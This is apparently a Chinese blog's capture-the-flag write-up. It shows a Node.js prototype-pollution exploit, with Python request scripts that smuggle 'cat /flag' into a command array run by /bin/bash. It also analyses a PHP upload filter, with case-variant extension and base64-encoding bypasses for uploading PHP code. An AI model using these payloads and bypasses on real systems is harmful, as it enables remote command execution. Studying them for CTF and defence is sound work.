<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(request.<span class="property">body</span>.<span class="property">user</span>)</span><br></pre></td></tr></table></figure>

<p><code>request.user</code>是初始化的<code>user</code>，所以无法直接污染，但是<code>user</code>是从请求体中得到的数据，并且通过Json格式化，其中是可以加一些实体（如<code>__proto__</code>,<code>constructor.prototype</code>）进去，是可以被我们污染的，所以，我们可以先污染<code>user</code>，然后通过<code>merge</code>合并，将<code>user</code>中的值传入<code>request.user</code>中</p>
<p>然后我们可以看看<code>merge</code>的内容，</p>
<h4 id="merge-js"><a href="#merge-js" class="headerlink" title="merge.js"></a>merge.js</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> whileTypes = [<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;bigint&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> source[key]) &amp;&amp; !whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> target[key]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(key !== <span class="string">&#x27;__proto__&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = merge</span><br></pre></td></tr></table></figure>

<p>发现<code>merge</code>对内容进行了过滤和检查，</p>
<ul>
<li>如果<code>request.user</code>或<code>user</code>中，有包含<code>whileTypes</code>中的内容，就不会执行<code>merge</code></li>
<li>如果键值中有<code>__proto__</code>，也不会执行<code>merge</code></li>
</ul>
<p>过滤关键字还好，只是过滤了<code>__proto__</code>，需要一个相同功能的来帮助绕过，比如<code>constructor.prototype</code></p>
<p>但是在<code>merge</code>前面还要个<code>checkUser</code>，将<code>command</code>也进行了限制</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkUser</span>(<span class="params">command</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(command) === <span class="literal">false</span> || command.<span class="property">length</span> &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; command.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> cmd = command[i];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> cmd !== <span class="string">&#x27;string&#x27;</span> || cmd.<span class="property">length</span> &gt; <span class="number">4</span> || <span class="title class_">RegExp</span>(<span class="regexp">/^[^a-zA-Z0-9-]+$/</span>).<span class="title function_">test</span>(command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由条件语句可知，要求<code>command</code>必须是数组且数组中元素个数要小于等于<code>2</code>，</p>
<p>且要求command数组中的元素必须为字符串且长度要小于等于4，并以字母或者数字或者-开头</p>
<p>如果不满足<code>checkUser</code>，就会执行：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">user.<span class="property">command</span> = [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>将<code>command</code>直接赋值为执行<code>id</code>命令，而不能执行其他命令。</p>
<p>&#x3D;&#x3D;&gt;再由初始化<code>request.user</code>，所以最后构造<code>request.body.user</code>的结构应该为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;&quot;</span>username<span class="string">&quot;:&quot;</span>guest<span class="string">&quot;,&quot;</span>command<span class="string">&quot;:[&quot;</span>-c<span class="string">&quot;,&quot;</span>id<span class="string">&quot;]&#125;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>只是我们想要执行的<code>command</code>是<code>cat /flag</code>，但是很明显我们长度限制过不了，所以如果想要执行命令是不能把值写到<code>command</code>中，不然肯定会被拦截</p>
<p>我们看看<code>user.js</code>中，是如何执行<code>command</code>的，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">handler : <span class="keyword">function</span> (<span class="params">request, reply</span>) &#123;</span><br><span class="line">                <span class="title class_">ChildProcess</span>.<span class="title function_">execFile</span>(bin, request.<span class="property">user</span>.<span class="property">command</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                        reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">info</span>: error&#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                    reply.<span class="title function_">code</span>(<span class="number">200</span>).<span class="title function_">send</span>(&#123; status : <span class="number">0</span> , info : <span class="string">`User of <span class="subst">$&#123;request.user.username&#125;</span> : <span class="subst">$&#123;stdout&#125;</span>`</span>&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>发现它执行是执行<code>request.user.command</code>的内容，那便又回到污染user，然后再通过<code>merge</code>污染<code>request.user</code>，所以这里尝试污染<code>request.user</code>的实体中的<code>command</code>参数</p>
<blockquote>
<p>但是，<code>request.user</code>在执行<code>merge</code>之前就已经有<code>command</code>值<code>[&quot;-c&quot;,&quot;id&quot;]</code>,所以作为一个已经存在的参数，就算污染了实体，它查找调用时还是会以它自己已有的值为先，所以如下图</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906122510728.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906122510728.png" alt="image-20230906122510728"></a></p>
<p>我们仔细执行命令的代码，发现它是将 <code>request.user.command</code>这个数组直接接到 <code>/bin/bash</code>后面</p>
<p>构造成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>这种命令。</p>
<p>但是突然想到一点，既然无法直接污染实体修改已有参数，那么如果在command数组中再加一个键值<code>2</code>，并且也是命令，能否也成功执行呢？</p>
<p>我们本地可以先测试一下，</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1:3000/user&quot;</span></span><br><span class="line">user=<span class="string">&#x27;&#x27;&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;2&quot;:&quot;whoami&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;,&quot;id&quot;]&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(requests.post(url=url, json=&#123;<span class="string">&quot;user&quot;</span>: user&#125;).text)</span><br></pre></td></tr></table></figure>

<p>只看调试结果，command数组的变化</p>
<p>开始都是一样的，再加上这里的command数组符合checkUser的要求，通过</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131218447.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131218447.png" alt="image-20230906131218447"></a></p>
<p>当运行到key为<code>prototype</code>时，</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131333083.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131333083.png" alt="image-20230906131333083"></a></p>
<p>可以看到<code>target</code>，也就是<code>request.user</code>，也获得了一个属性2且值为<code>whoami</code>的，说明污染成功</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131429139.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131429139.png" alt="image-20230906131429139"></a></p>
<p>继续看对command数组的影响，虽然两者<code>command</code>数组一样，但是后面就会出现区别</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906133038986.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906133038986.png" alt="image-20230906133038986"></a></p>
<p>发现在不断的<code>merge</code>合并时，<code>user</code>和<code>request.user</code>中两者的数组中的<code>key</code>也在比较，但是由于两者的<code>command</code>数组中是字符串，属于<code>whileTypes</code>，所以会直接将<code>target[key] = source[key];</code>，也就是将<code>user</code>中值赋值给<code>request.user</code>，也就是修改<code>command</code>值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> whileTypes = [<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;bigint&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> source[key]) &amp;&amp; !whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> target[key]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(key !== <span class="string">&#x27;__proto__&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    target[key] = source[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>key=0</code>和<code>key=1</code>两者都一样都是<code>-c</code>,<code>id</code>，所以赋值没有变化</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906132428230.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906132428230.png" alt="image-20230906132428230"></a></p>
<p>当<code>key=2</code>时，因为之前执行<code>prototype</code>时，使得<code>request.user</code>也有属性2这个值，</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906133910040.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906133910040.png" alt="image-20230906133910040"></a></p>
<p>虽然这个属性2是在Object中，但是是在Array之上，所以即便command数组中没有key&#x3D;2，但是仍然就会从原型链中寻找，所以当再次运行到<code>target[key] = source[key];</code>时，属性2就被当作command的属性2，赋值进去了</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906134039538.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906134039538.png" alt="image-20230906134039538"></a></p>
<p>于是最后执行命令时就是，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="built_in">id</span> <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>

<p>由这个现象便可以构造出<code>payload</code>，可以看到便得到flag{test}</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://172.28.31.86:3000/user&quot;</span></span><br><span class="line">user=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;2&quot;:&quot;cat /flag&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;,&quot;-i&quot;]&#125;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="title function_">print</span>(&#123;<span class="string">&quot;user&quot;</span>:user&#125;)</span><br><span class="line"><span class="title function_">print</span>(requests.<span class="title function_">post</span>(url=url, json=&#123;<span class="string">&quot;user&quot;</span>: user&#125;).<span class="property">text</span>)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906134555175.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906134555175.png" alt="image-20230906134555175"></a></p>
<p>当然这只是一个，同理，既然限制command数组中元素个数要小于等于2，所以一个也是可以的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># <span class="attr">http</span>:<span class="comment">//172.28.31.86:3000/user</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://172.28.31.86:3000/user&quot;</span></span><br><span class="line">user=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;1&quot;:&quot;cat /flag&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;]&#125;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="title function_">print</span>(&#123;<span class="string">&quot;user&quot;</span>:user&#125;)</span><br><span class="line"><span class="title function_">print</span>(requests.<span class="title function_">post</span>(url=url, json=&#123;<span class="string">&quot;user&quot;</span>: user&#125;).<span class="property">text</span>)</span><br></pre></td></tr></table></figure>

<p>结果同上，只是不能让command为空就行，不然会报错</p>
<hr>
<p>直接浏览器<code>console</code>，展示也可以理解原理</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906160734249.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906160734249.png" alt="image-20230906160734249"></a></p>
<p>这里的属性2实际是在command实体中</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906160836260.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906160836260.png" alt="image-20230906160836260"></a></p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>2022RCTF</title>
    <url>/2022RCTF/</url>
    <content><![CDATA[<p><code>学到很多</code></p>
<span id="more"></span>

<h1 id="RCTF2022"><a href="#RCTF2022" class="headerlink" title="RCTF2022"></a>RCTF2022</h1><h2 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h2><blockquote>
<p>附件</p>
<p><a href="https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar">https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar</a></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122145933429.png"><img src="/2022RCTF/image-20230122145933429.png" alt="image-20230122145933429"></a></p>
<p>这是一个文件上传的题目，题目开始给出了题目附件，先查看一下源码查看上传文件过滤哪些东西</p>
<p>核心就是一个<code>UploadController.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Filesystem</span>\<span class="title">Path</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Annotation</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalid</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;error occurs: <span class="subst">$msg</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#[Route</span>(<span class="string">&#x27;/&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;upload&#x27;</span>)<span class="meta">]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadHtml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span> == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">                <span class="comment">//&#x27;&lt;p&gt;Before start you should know that it\&#x27;s not a good challenge.You can\&#x27;t get anything from this challenge.If you hate this challenge, just skip plz. &lt;/p&gt;&lt;p&gt;这道题并不是一道好题，你不会从这道题上获得任何东西。如果你讨厌这道题就直接跳过吧。&lt;/p&gt;&#x27;</span></span><br><span class="line">                <span class="variable">$uploadHtml</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$ext</span> = <span class="title class_">Path</span>::<span class="title function_ invoke__">getExtension</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$request</span>-&gt;server-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload success&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到过滤包含了<code>后缀过滤</code>和<code>文件内容过滤</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>后缀名黑名单</strong>过滤代码，过滤了<code>php,ini,phtml,htaccess</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的这里是用<code>strstr()</code>进行匹配，而<code>strstr()</code>是区分大小写的，所以这里可以用<code>.pHp</code>，或者<code>.PHP</code>进行绕过对<code>.php</code>的过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br></pre></td></tr></table></figure>

<p>代码最后可以看到后缀名被<code>strtolower()</code>处理，转化为小写，但是这里已经不影响，因为前面已经绕过了过滤</p>
</blockquote>
<blockquote>
<p><strong>文件内容黑名单</strong>明确了<code>&quot;&lt;?&quot;, &quot;php&quot;, &quot;handler&quot;</code></p>
<p>可以看到代码中对文件内容的判断，其中涉及了<code>mb_detect_encoding()</code>函数</p>
<blockquote>
<p><code>mb_detect_encoding()</code>：从有序的候选列表中 检测字符串 最可能的字符编码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span>|<span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$encodings</span> = <span class="literal">null</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p><code>$strict</code>控制在列出的任何编码中字符串无效时的行为。如果<code>strict</code>设置为<code>false</code>，则返回最接近的匹配编码;如果<code>strict</code>设置为<code>true</code>，则返回<code>false</code>。</p>
<p>当<code>$encodings</code>省略或者为空时，会从<code>mb_detect_order()</code>中按顺序进行测试</p>
<p>该题代码中为<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code></p>
</blockquote>
